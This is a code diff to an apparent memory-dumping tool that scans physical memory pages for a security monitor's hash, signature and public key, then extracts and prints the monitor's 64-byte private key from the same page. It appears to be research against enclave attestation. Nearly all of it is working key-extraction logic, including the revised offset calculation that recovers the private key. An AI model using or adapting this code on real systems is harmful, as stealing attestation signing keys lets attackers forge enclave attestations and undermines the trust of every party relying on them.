@@ -225,18 +225,33 @@ static void __print_bytes(const byte *buf, size_t buf_len) {
 
 static void __dump_memory(struct report_t *report_s) {
   // same as the store sequence in sm.c
+  // byte sm_hash[MDSIZE] = {0,};
+  // byte sm_signature[SIGNATURE_SIZE] = {0,};
+  // byte sm_public_key[PUBLIC_KEY_SIZE] = {0,};
+  // byte sm_private_key[PRIVATE_KEY_SIZE] = {0,};
+  // byte dev_public_key[PUBLIC_KEY_SIZE] = {0,};
+
   byte *sm_hash = report_s->sm.hash;
   byte *sm_signature = report_s->sm.signature;
   byte *sm_pub_key = report_s->sm.public_key;
-  size_t pattern_size = MDSIZE + SIGNATURE_SIZE + PUBLIC_KEY_SIZE;
 
-  byte pattern[pattern_size];
-  std::memcpy(pattern + 0, sm_hash, MDSIZE);
-  std::memcpy(pattern + MDSIZE, sm_signature, SIGNATURE_SIZE);
-  std::memcpy(pattern + MDSIZE + SIGNATURE_SIZE, sm_pub_key, PUBLIC_KEY_SIZE);
+  printf("====================DEBUG=================\n");
+  printf("SM Hash:\t");
+  __print_bytes(sm_hash, MDSIZE);
+  printf("SM Sig:\t");
+  __print_bytes(sm_signature, SIGNATURE_SIZE);
+  printf("SM Pub key:\t");
+  __print_bytes(sm_pub_key, PUBLIC_KEY_SIZE);
+  //  size_t pattern_size = MDSIZE + SIGNATURE_SIZE + PUBLIC_KEY_SIZE;
+  //  byte pattern[pattern_size];
+  //  std::memcpy(pattern + 0, sm_hash, MDSIZE);
+  //  std::memcpy(pattern + MDSIZE, sm_signature, SIGNATURE_SIZE);
+  //  std::memcpy(pattern + MDSIZE + SIGNATURE_SIZE, sm_pub_key,
+  //  PUBLIC_KEY_SIZE);
+  // printf("Pattern Created\n");
+  // __print_bytes(pattern, pattern_size);
+  printf("====================DEBUG=================\n");
 
-  printf("Pattern Created\n");
-  __print_bytes(pattern, pattern_size);
   // Just dump pages:
   char buf[4096] = {0};
   page_stats_t stats;
@@ -252,16 +267,22 @@ static void __dump_memory(struct report_t *report_s) {
       printf("PAddr reading Error\n");
       return;
     }
-    // if hash, signature, pub key sequence exists and no enclave data exists we
-    // have the page to the private key
-    if (__check_pattern(buf, pattern, pattern_size) &&
+    // if 3 SM data exist in a page (hash, signature, pub key)
+    // and no enclave data exists we
+    // have the page that also contains private key
+    if ((__check_pattern(buf, sm_hash, MDSIZE) &&
+         __check_pattern(buf, sm_signature, SIGNATURE_SIZE) &&
+         __check_pattern(buf, sm_pub_key, PUBLIC_KEY_SIZE)) &&
         !__check_pattern(buf, report_s->enclave.hash, MDSIZE)) {
       __print_page(buf, paddr_candidate);
-      if (__extract_private_key(buf, pattern, pattern_size, private_key)) {
+      if (__extract_private_key(buf, sm_pub_key, PUBLIC_KEY_SIZE,
+                                private_key)) {
         printf("Private Key Found:\n");
         __print_bytes(private_key, 64);
+        return;
       } else {
         printf("Private Key Not Found:\n");
+        return;
       }
     }
     // maybe compare with the public key to see that we can reach the page
@@ -269,15 +290,18 @@ static void __dump_memory(struct report_t *report_s) {
   }
 }
 
-static bool __extract_private_key(const char buf[0x1000], byte *pattern,
-                                  size_t pattern_size, byte *private_key) {
-
+static bool __extract_private_key(const char buf[0x1000], byte *pub_key,
+                                  size_t pubkey_size, byte *private_key) {
   printf("Extracting private key...\n");
-  for (int i = 0; i <= (0x1000 - pattern_size); i++) {
-    if (memcmp(&buf[i], pattern, pattern_size) == 0) {
-      // found the whole pattern now we need the next PRIVATE_KEY_SIZE
+  for (int i = 0; i <= (0x1000 - pubkey_size); i++) {
+    if (memcmp(&buf[i], pub_key, pubkey_size) == 0) {
+      // found the public key in page at buf+i we need PRIVATE_KEY_SIZE
       // bytes in the private key variable
-      memcpy(private_key, (buf + i), 64);
+      // based on documentation private key is 64 bytes and includes public key
+      // => private key start = (buf+i) - (64-public key size)
+      // ==> copy 64 bytes starting from private key start pointer in page
+      //
+      memcpy(private_key, ((buf + i) - (64 - pubkey_size)), 64);
       // private key size is 64 bytes including public key
       return true;
     }
